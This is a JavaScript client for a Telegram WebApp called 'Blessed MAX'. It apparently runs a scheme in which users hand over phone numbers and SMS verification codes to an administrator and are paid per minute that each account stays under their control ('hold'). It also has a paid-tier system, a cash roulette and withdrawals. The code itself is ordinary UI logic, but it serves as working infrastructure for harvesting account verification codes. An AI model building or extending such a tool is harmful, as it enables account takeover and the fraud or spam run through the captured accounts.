/* Blessed MAX — script.js (R18+) */
/* Robust Telegram WebApp client for index.html.
   Works with aiohttp API from bot.py and schema in db.py. */

/* ====== Config ====== */
const tg = window.Telegram?.WebApp || null;
if (tg && typeof tg.expand === "function") tg.expand();

const qp = new URLSearchParams(location.search);
// ЗАМЕНИ на свой tunnel при необходимости:
const API_BASE = "https://searching-buys-most-stated.trycloudflare.com";

const initData = tg?.initData || qp.get("initData") || "";
const authUser = tg?.initDataUnsafe?.user || null;
const USER = {
  id: authUser?.id || Number(qp.get("user_id")) || 0,
  username: authUser?.username || authUser?.first_name || qp.get("username") || "user",
};

// Feature flags
const F = {
  debug: !!qp.get("debug"),
  // In GitHub Pages you must set ?api=https://<trycloudflare-host>
};

/* ====== DOM helpers ====== */
const $  = (sel, root = document) => root.querySelector(sel);
const $$ = (sel, root = document) => Array.from(root.querySelectorAll(sel));

function show(node) { node?.classList.remove("hidden"); node?.setAttribute("aria-hidden", "false"); }
function hide(node) { node?.classList.add("hidden");   node?.setAttribute("aria-hidden", "true"); }

function setText(node, text) { if (node) node.textContent = String(text ?? ""); }
function html(node, markup) { if (node) node.innerHTML = markup; }

/* ====== Notifications ====== */
const notifRoot = $("#notify-root");
function toast(title, msg = "", opts = {}) {
  const el = document.createElement("div");
  el.className = "notif";
  el.innerHTML = `
    <div class="title">${escapeHtml(title)}</div>
    <div class="msg">${escapeHtml(msg)}</div>
    <button class="x" aria-label="Закрыть">×</button>
  `;
  notifRoot.appendChild(el);
  const t = setTimeout(() => close(), opts.timeout ?? 3500);
  function close() { clearTimeout(t); el.remove(); }
  el.querySelector(".x").onclick = close;
  return { close };
}

const modalWrap = $("#notify-modal");
$("#notify-close")?.addEventListener("click", () => hide(modalWrap));
$(".notify-backdrop")?.addEventListener("click", () => hide(modalWrap));
function alertModal(title, content) {
  setText($("#notify-title"), title);
  setText($("#notify-content"), content);
  show(modalWrap);
}

/* ====== HTTP ====== */
function apiUrl(path) {
  if (!API_BASE) return null;
  return API_BASE + (path.startsWith("/") ? path : "/" + path);
}

async function post(path, data = {}, opts = {}) {
  if (!API_BASE) throw new Error("API_BASE is not set. Pass ?api=https://your-host");
  const url = apiUrl(path);
  const payload = {
    ...data,
    // server prefers Telegram initData for auth. If absent, use user_id as fallback.
    initData,
    user_id: USER.id || undefined,
    username: USER.username || undefined,
  };

  const r = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
    mode: "cors",
    redirect: "follow",
  }).catch((e) => ({ ok: false, status: 0, _err: e }));

  if (!r || !("ok" in r) || !r.ok) {
    const text = (await r?.text?.()) || String(r?._err || "Fetch failed");
    const err = new Error(`HTTP ${r?.status || 0}: ${text}`);
    err._http = r;
    throw err;
  }
  return r.json();
}

/* ====== State ====== */
const S = {
  lastSubmissionId: null,
  stats: null,
  prices: { premium: 40.0, speed: 30.0 },
};

/* ====== UI wiring ====== */
const screens = {
  menu: $("#menu"),
  stats: $("#screen-stats"),
  submit: $("#screen-submit"),
  report: $("#screen-report"),
  priv: $("#screen-priv"),
  roulette: $("#screen-roulette"),
  withdraw: $("#screen-withdraw"),
  contests: $("#screen-contests"),
};

// Делает внутренний скролл на всех экранах, кроме главного меню
Object.values(screens).forEach(s => s?.classList?.add("scrollable"));
screens.menu?.classList?.remove("scrollable");

function goto(name) {
  Object.values(screens).forEach(hide);
  const scr = screens[name];
  show(scr);
  if (name !== "menu") window.scrollTo({ top: 0 });
}

function bindMenu() {
  $("#menu .grid")?.addEventListener("click", (e) => {
    const btn = e.target.closest("button[data-screen]");
    if (!btn) return;
    const scr = btn.dataset.screen;
    if (scr === "stats") { goto("stats"); refreshStats(); return; }
    if (scr === "submit") { goto("submit"); return; }
    if (scr === "report") { goto("report"); refreshReport(); return; }
    if (scr === "priv")   { goto("priv");   refreshPriv(); return; }
    if (scr === "roulette") { goto("roulette"); setupRouletteOnce(); return; }
    if (scr === "withdraw") { goto("withdraw"); refreshWithdrawBalance(); return; }
    if (scr === "contests") { goto("contests"); refreshContests(); return; }
  });
  $$(".back").forEach(b => b.addEventListener("click", () => goto("menu")));
  $("#refreshLogs")?.addEventListener("click", refreshLogs);
}

/* ====== Bootstrap ====== */
async function bootstrap() {
  try {
    const r = await post("/api/bootstrap", {});
    if (r?.ok) {
      S.stats = r.stats || {};
      html($("#statsBox"), prettyStats(S.stats));
      await refreshLogs();
      await refreshPriv(); // also picks up prices
      await refreshWithdrawBalance();
    }
  } catch (e) {
    toast("API недоступно", "Проверь ?api= и туннель Cloudflare");
    if (F.debug) console.error(e);
  }
}

/* ====== Stats ====== */

function prettyStats(st){
  if (!st) return `<div class="muted">Нет данных</div>`;
  const rows = [
    ["Пользователь", st.username || USER.username],
    ["Баланс", `$${fmtMoney(st.balance)}`],
    ["Успехи / Провалы", `${st.success_count ?? 0} / ${st.fail_count ?? 0}`],
    ["Заработано", `$${fmtMoney(st.earned)}`],
    ["Рулетка", `потрачено $${fmtMoney(st.spent_roulette)} • выиграно $${fmtMoney(st.won_roulette)}`],
    ["Тариф", `${st.plan || "standard"}`],
    ["Старт тарифа", `${st.plan_started || "—"}`],
    ["Действует до", `${st.plan_until || "—"}`],
    ["С первых пор", `${st.first_seen || "—"}`],
  ];
  return rows.map(([k,v]) => `<div class="k">${escapeHtml(k)}</div><div class="v">${escapeHtml(v)}</div>`).join("");
}


async function refreshStats() {
  try {
    const r = await post("/api/stats", {});
    if (r?.ok) {
      S.stats = r.stats || {};
      html($("#statsBox"), prettyStats(S.stats));
    }
  } catch (e) {
    html($("#statsBox"), `<div class="err">Ошибка загрузки статистики</div>`);
    if (F.debug) console.error(e);
  }
}

/* ====== Logs ====== */
async function refreshLogs() {
  try {
    const r = await post("/api/logs", {});
    if (!r?.ok) throw new Error("bad");
    const box = $("#chat");
    box.innerHTML = "";
    (r.events || []).forEach(ev => {
      const item = document.createElement("div");
      item.className = `log ${ev.role || "system"}`;
      const ts = safeDate(ev.ts);
      item.innerHTML = `<span class="ts">${ts}</span><span class="who">${roleLabel(ev.role)}</span><span class="txt">${escapeHtml(ev.text)}</span>`;
      box.appendChild(item);
    });
    box.scrollTop = box.scrollHeight;
  } catch (e) {
    toast("Не удалось загрузить логи");
    if (F.debug) console.error(e);
  }
}

function roleLabel(r) {
  if (r === "user") return "Вы";
  if (r === "admin") return "Админ";
  return "Система";
}

/* ====== Submit MAX ====== */
function bindSubmit() {
  $("#sendPhone")?.addEventListener("click", async () => {
    const phone = $("#phone").value.trim();
    if (!phone) return toast("Введите номер", "Поле не может быть пустым");
    try {
      const r = await post("/api/submit_phone", { phone });
      if (!r?.ok) throw new Error("bad");
      S.lastSubmissionId = r.submission_id;
      toast("Номер принят", "Ожидайте. Введите код из SMS.");
      show($("#codePanel"));
    } catch (e) {
      toast("Ошибка отправки номера");
      if (F.debug) console.error(e);
    }
  });

  $("#sendCode")?.addEventListener("click", async () => {
    const code = $("#code").value.trim();
    if (!S.lastSubmissionId) return toast("Сначала отправьте номер");
    if (!code) return toast("Введите код из SMS");
    try {
      const r = await post("/api/submit_code", { submission_id: S.lastSubmissionId, code });
      if (!r?.ok) throw new Error("bad");
      toast("Код отправлен", "Администратор проверит код.");
      hide($("#codePanel"));
      $("#phone").value = "";
      $("#code").value = "";
      await refreshLogs();
      goto("menu");
    } catch (e) {
      toast("Ошибка отправки кода");
      if (F.debug) console.error(e);
    }
  });
}

/* ====== My numbers report ====== */
async function refreshReport() {
  const box = $("#reportList");
  html(box, "Загрузка…");
  try {
    const r = await post("/api/my_numbers", {});
    if (!r?.ok) throw new Error("bad");
    const rows = r.rows || [];
    if (!rows.length) return html(box, `<div class="muted">Нет заявок</div>`);
    const out = rows.map(row => {
      const m = Number(row.minutes || 0);
      const earned = fmtMoney(row.earned || 0);
      return `
        <div class="report-row">
          <div class="r1">
            <div class="phone">${escapeHtml(row.phone)}</div>
            <div class="status ${statusClass(row.status)}">${escapeHtml(row.status)}</div>
          </div>
          <div class="r2">
            <div class="mins">${m} мин</div>
            <div class="earned">$${earned}</div>
          </div>
        </div>`;
    }).join("");
    html(box, out);
  } catch (e) {
    html(box, `<div class="err">Ошибка загрузки отчёта</div>`);
    if (F.debug) console.error(e);
  }
}
$("#reportRefresh")?.addEventListener("click", refreshReport);

function statusClass(s) {
  if (!s) return "";
  s = s.toLowerCase();
  if (s.includes("холд")) return "ok";
  if (s.includes("слёт")) return "warn";
  if (s.includes("approved")) return "ok";
  if (s.includes("rejected") || s.includes("wrong")) return "bad";
  return "";
}

/* ====== Privileges ====== */
async function refreshPriv() {
  try {
    const r = await post("/api/priv/info", {});
    if (!r?.ok) throw new Error("bad");
    const p = r.plan || {};
    const rate = r.rate;
    const prices = r.prices || S.prices;
    S.prices = prices;

    setText($("#price-premium"), `$${fmtMoney(prices.premium)}`);
    setText($("#price-speed"), `$${fmtMoney(prices.speed)}`);
    const summary = `Тариф: ${p.plan || "—"} • Ставка: $${fmtMoney(rate)} • Действует до: ${p.plan_until || "—"}`;
    setText($("#privSummary"), summary);

    const active = (p.plan || "").toLowerCase();
    const bp = $("#buy-premium");
    const bs = $("#buy-speed");
    const std = $("#std-activate");

    function setPlanBtn(btn, isActive){
      if (!btn) return;
      if (isActive){
        btn.textContent = "Активирован";
        btn.disabled = true;
        btn.classList.add("active");
      } else {
        btn.textContent = "Купить";
        btn.disabled = false;
        btn.classList.remove("active");
      }
    }
    setPlanBtn(bp, active === "premium");
    setPlanBtn(bs, active === "speed");
    if (std) std.textContent = active === "standard" ? "Активный" : "Активировать";
    
  } catch (e) {
    setText($("#privSummary"), "Ошибка загрузки тарифов");
    if (F.debug) console.error(e);
  }
}

$("#buy-premium")?.addEventListener("click", () => confirmBuy("premium"));
$("#buy-speed")?.addEventListener("click", () => confirmBuy("speed"));

$("#std-activate")?.addEventListener("click", async () => {
  try {
    const r = await post("/api/priv/activate_standard", {});
    if (r?.ok) {
      toast("Активирован «Стандарт»", `Возврат $${fmtMoney(r.refund || 0)}`);
      await refreshPriv(); 
      await refreshWithdrawBalance();
    }
  } catch (e) {
    toast("Ошибка активации тарифа");
    if (F.debug) console.error(e);
  }
});

async function confirmBuy(plan) {
  try {
    const r = await post("/api/priv/buy", { plan });
    if (r?.ok) {
      toast("Поздравляем с покупкой", "Тариф активирован");
      await refreshPriv();
      await refreshWithdrawBalance();
    } else {
      const err = String(r?.error || "");
      if (err.includes("NO_FUNDS")) toast("Недостаточно средств");
      else toast("Покупка не удалась");
    }
  } catch (e) {
    if (String(e.message || "").includes("NO_FUNDS")) toast("Недостаточно средств");
    else toast("Покупка не удалась");
    if (F.debug) console.error(e);
  }
}

/* ====== Roulette (fixed center align) ====== */
let rouletteReady = false;
const PRIZES = [
  {v:0.10, icon:"🟦", cls:"r-cmn"},
  {v:0.20, icon:"🟦", cls:"r-cmn"},
  {v:0.30, icon:"🟪", cls:"r-uc"},
  {v:0.40, icon:"🟦", cls:"r-cmn"},
  {v:0.50, icon:"🟨", cls:"r-rare"},
  {v:0.60, icon:"🟦", cls:"r-cmn"},
  {v:0.70, icon:"🟪", cls:"r-uc"},
  {v:0.80, icon:"⚡",  cls:"r-rare"},
  {v:0.90, icon:"🟦", cls:"r-cmn"},
  {v:1.00, icon:"💠", cls:"r-uc"},
  {v:1.10, icon:"🎁", cls:"r-rare"},
  {v:1.20, icon:"💎", cls:"r-legend"},
  {v:1.30, icon:"💎", cls:"r-legend"}
];
const RU_REPEAT = 8;
let ruStripBuilt = false;

function setupRouletteOnce() {
  if (rouletteReady) return;
  rouletteReady = true;
  buildRouletteStrip();
  $("#ru-spin")?.addEventListener("click", spin);
}

function buildRouletteStrip() {
  const strip = $("#case-strip");
  if (!strip || ruStripBuilt) return;
  const chunk = PRIZES.map(p =>
    `<div class="case-item ${p.cls}"><div class="ico">${p.icon}</div><div class="amt">$${fmtMoney(p.v)}</div></div>`
  ).join("");
  strip.innerHTML = new Array(RU_REPEAT).fill(chunk).join("");
  strip.style.transform = "translateX(0px)";
  ruStripBuilt = true;
}

function measure() {
  const wrap = $(".case-wrap");
  const strip = $("#case-strip");
  const first = strip?.querySelector(".case-item");
  if (!wrap || !strip || !first) return null;
  const cs = getComputedStyle(strip);
  const gap = parseFloat(cs.gap || cs.columnGap || "0") || 0;
  const padL = parseFloat(cs.paddingLeft || "0") || 0;
  const tileW = first.getBoundingClientRect().width;           // фактическая ширина
  const stride = tileW + gap;                                  // шаг с учётом gap
  const pointerX = Math.round(wrap.getBoundingClientRect().width / 2);
  return { wrap, strip, tileW, stride, padL, pointerX };
}

async function spin() {
  const m = measure();
  if (!m) return;
  const { wrap, strip, tileW, stride, padL, pointerX } = m;
  const resBox = $("#ru-result");
  const btn = $("#ru-spin");

  btn.disabled = true;
  btn.dataset._label = btn.textContent;
  btn.textContent = "Крутится…";
  wrap.classList.add("spinning");
  setText(resBox, "Крутится…");

  // ask server
  let win = null, balance = null, winIndex = null;
  try {
    const r = await post("/api/roulette_spin", {});
    if (!r?.ok) throw new Error("bad");
    win = Number(r.win || 0);
    balance = Number(r.balance || 0);
    // если сервер присылает индекс — используем его
    if (Number.isInteger(r.win_index)) winIndex = Number(r.win_index);
  } catch (e) {
    toast("Спин недоступен", "Пополните баланс или повторите позже");
    unlock();
    return;
  }

  const baseIdx = Number.isInteger(winIndex)
    ? clampIndex(winIndex, 0, PRIZES.length - 1)
    : nearestPrizeIndex(PRIZES.map(p => p.v), win);

  const totalItems = PRIZES.length * RU_REPEAT;
  const cycles = 7 + Math.floor(Math.random() * 3); // 7..9
  const targetIndex = cycles * PRIZES.length + baseIdx;

  // точный центр плитки baseIdx под центральным указателем:
  const targetCenter = padL + targetIndex * stride + tileW / 2;
  const target = Math.round(targetCenter - pointerX);

  // animate to exact pixel
  const dur = 3200;
  const start = performance.now();
  const startX = currentTranslateX(strip); // вдруг пользователь крутил ранее
  const delta = -target - startX;

  strip.style.willChange = "transform";
  requestAnimationFrame(function step(t) {
    const p = Math.min(1, (t - start) / dur);
    const eased = cubicOut(p);
    const x = startX + delta * eased;
    strip.style.transform = `translateX(${Math.round(x)}px)`;
    if (p < 1) requestAnimationFrame(step);
    else onStop();
  });

  function onStop() {
    // финальная фиксация на точное значение
    strip.style.transform = `translateX(${-target}px)`;
    // короткий визуальный отклик без смещения центра
    strip.animate(
      [{ transform: `translateX(${-target}px)` }, { transform: `translateX(${-target}px)` }],
      { duration: 200 }
    );

    setText(resBox, `Выигрыш: $${fmtMoney(win)}`);
    toast("Результат", `$${fmtMoney(win)} • Баланс $${fmtMoney(balance)}`);
    refreshWithdrawBalance();
    refreshLogs();
    unlock();
  }

  function unlock() {
    wrap.classList.remove("spinning");
    btn.disabled = false;
    if (btn.dataset._label) btn.textContent = btn.dataset._label;
  }
}

function nearestPrizeIndex(arr, val) {
  let best = 0, diff = Infinity;
  for (let i = 0; i < arr.length; i++) {
    const d = Math.abs(arr[i] - val);
    if (d < diff) { diff = d; best = i; }
  }
  return best;
}
function clampIndex(i, lo, hi){ return Math.max(lo, Math.min(hi, i)); }
function cubicOut(t) { const f = t - 1; return f*f*f + 1; }
function currentTranslateX(el){
  const m = getComputedStyle(el).transform;
  if (!m || m === "none") return 0;
  const a = m.match(/matrix\(([^)]+)\)/);
  if (!a) return 0;
  const parts = a[1].split(",").map(Number);
  return Math.round(parts[4] || 0); // e (translateX)
}

/* ====== Withdraw ====== */
async function refreshWithdrawBalance() {
  try {
    const r = await post("/api/stats", {});
    if (r?.ok) {
      S.stats = r.stats || S.stats;
      setText($("#wdBalance"), fmtMoney(S.stats?.balance || 0));
      html($("#statsBox"), prettyStats(S.stats));
    }
  } catch {}
}

$("#wdSend")?.addEventListener("click", async () => {
  const amt = Number($("#wdAmount").value);
  if (!(amt >= 5 && amt <= 100)) return toast("Сумма 5–100$");
  try {
    const r = await post("/api/withdraw_request", { amount: amt });
    if (r?.ok) {
      toast("Заявка отправлена", `#${r.payout_id}`);
      $("#wdAmount").value = "";
      await refreshWithdrawBalance();
    } else {
      toast("Ошибка заявки");
    }
  } catch (e) {
    const msg = e.message.includes("NO_FUNDS") ? "Недостаточно средств" :
                e.message.includes("PENDING_EXISTS") ? "Есть активная заявка" :
                "Ошибка запроса";
    toast(msg);
    if (F.debug) console.error(e);
  }
});

$("#wdCancel")?.addEventListener("click", async () => {
  try {
    const r = await post("/api/withdraw_cancel", {});
    if (r?.ok) {
      toast("Заявка отменена");
      await refreshWithdrawBalance();
    } else toast("Отменить не удалось");
  } catch (e) {
    toast("Ошибка отмены");
  }
});

/* ====== Contests ====== */
let LB_TIMER = null;

async function refreshContests() {
  const box = $("#contestList");
  html(box, "Загрузка…");
  try {
    const r = await post("/api/contests", {});
    if (!r?.ok) throw new Error("bad");
    const items = r.items || [];
    if (!items.length) return html(box, `<div class="muted">Конкурсов нет</div>`);
    const out = items.map(c => {
      const until = c.until ? `<div class="muted">До: ${escapeHtml(c.until)}</div>` : "";
      const joined = c.joined ? `<span class="ok">• Вы участвуете</span>` : "";
      return `<div class="contest-card" data-id="${c.id}">
        <div class="title">${escapeHtml(c.title)}</div>
        <div class="prize">Приз: ${escapeHtml(c.prize)} ${joined}</div>
        ${until}
        <div class="muted">Участников: ${Number(c.entries || 0)}</div>
        <div class="row">
          <button class="join" data-id="${c.id}" ${c.joined ? "disabled":""}>${c.joined?"Участвуете":"Участвовать"}</button>
          <button class="leaders" data-id="${c.id}">Таблица</button>
        </div>
      </div>`;
    }).join("");
    html(box, out);
  } catch (e) {
    html(box, `<div class="err">Ошибка загрузки конкурсов</div>`);
    if (F.debug) console.error(e);
  }
}

$("#screen-contests")?.addEventListener("click", async (e) => {
  const join = e.target.closest("button.join");
  const lead = e.target.closest("button.leaders");
  if (join) {
    const cid = Number(join.dataset.id);
    try {
      const r = await post("/api/contest_join", { contest_id: cid });
      if (r?.ok) {
        toast("Участие принято", "Минуты будут считаться с этого момента");
        await refreshContests();
      } else if (r?.error === "ALREADY") toast("Вы уже участвуете");
      else if (r?.error === "CLOSED") toast("Конкурс закрыт");
      else toast("Ошибка участия");
    } catch {
      toast("Ошибка участия");
    }
  }
  if (lead) {
    const cid = Number(lead.dataset.id);
    openLeaderboard(cid);
  }
});

async function openLeaderboard(cid){
  clearInterval(LB_TIMER);
  const dlg = $("#notify-modal");
  const titleEl = $("#notify-title");
  const contentEl = $("#notify-content");
  $("#notify-close").onclick = () => { hide(dlg); clearInterval(LB_TIMER); };

  titleEl.textContent = `Таблица конкурса #${cid}`;
  show(dlg);

  async function loadOnce(){
    try{
      const r = await post("/api/contest_leaderboard", { contest_id: cid });
      if (!r?.ok) throw 0;
      const rows = r.rows || [];
      if (!rows.length){
        contentEl.innerHTML = `<div class="muted">Пока нет участников</div>`;
        return;
      }
      const meRow = rows.find(x => x.me);
      const list = rows.map(row => `
        <div class="lb-row ${row.me?"me":""}">
          <div class="pos">#${row.rank}</div>
          <div class="name">${escapeHtml(row.username || ("id"+row.user_id))}</div>
          <div class="mins">${row.minutes} мин</div>
        </div>`).join("");
      contentEl.innerHTML = `
        ${meRow ? `<div class="lb-me">Ваше место: #${meRow.rank} • ${meRow.minutes} мин</div>`:""}
        <div class="lb">${list}</div>`;
    }catch{
      contentEl.innerHTML = `<div class="err">Ошибка загрузки таблицы</div>`;
    }
  }
  await loadOnce();
  LB_TIMER = setInterval(() => {
    if (dlg.classList.contains("hidden")) { clearInterval(LB_TIMER); return; }
    loadOnce();
  }, 10000);
}

/* ====== Utilities ====== */
function fmtMoney(n) {
  const num = Number(n || 0);
  return num.toFixed(2).replace(/\.00$/, ".00").replace(/(\.\d)0$/, "$1");
}
function safeDate(s) {
  if (!s) return "";
  try {
    const d = new Date(s.replace(" ", "T") + "Z");
    return d.toLocaleString();
  } catch { return s; }
}
function escapeHtml(s) {
  return String(s ?? "").replace(/[&<>"']/g, (c) => ({
    "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#039;"
  })[c]);
}

/* ====== Startup ====== */
document.addEventListener("DOMContentLoaded", () => {
  bindMenu();
  bindSubmit();
  // default screen
  goto("menu");
  bootstrap();
});

/* ====== Accessibility & Minor UX ====== */
document.addEventListener("keydown", (e) => {
  if (e.key === "Escape") {
    if (!screens.menu.classList.contains("hidden")) return;
    goto("menu");
  }
});
/* Modal confirm that returns a Promise<boolean> */
function confirmModal(title, content, okText="Купить", cancelText="Отмена"){
  const dlg = $("#notify-modal");
  const titleEl = $("#notify-title");
  const contentEl = $("#notify-content");
  const closeBtn = $("#notify-close");
  const actionsId = "notify-actions";
  // Build actions
  const actions = document.createElement("div");
  actions.id = actionsId;
  actions.className = "notify-actions";
  actions.innerHTML = `<button class="notify-btn secondary" id="notify-cancel">${escapeHtml(cancelText)}</button>
                       <button class="notify-btn" id="notify-ok">${escapeHtml(okText)}</button>`;
  titleEl.textContent = title;
  contentEl.textContent = content;
  contentEl.appendChild(actions);
  show(dlg);
  closeBtn.style.display = "none";

  return new Promise((resolve)=>{
    const onCancel = ()=>{ cleanup(); resolve(false); };
    const onOk = ()=>{ cleanup(); resolve(true); };
    $("#notify-cancel").addEventListener("click", onCancel, {once:true});
    $("#notify-ok").addEventListener("click", onOk, {once:true});
    $(".notify-backdrop").addEventListener("click", onCancel, {once:true});
    function cleanup(){
      hide(dlg);
      closeBtn.style.display = "";
      actions.remove();
    }
  });
}

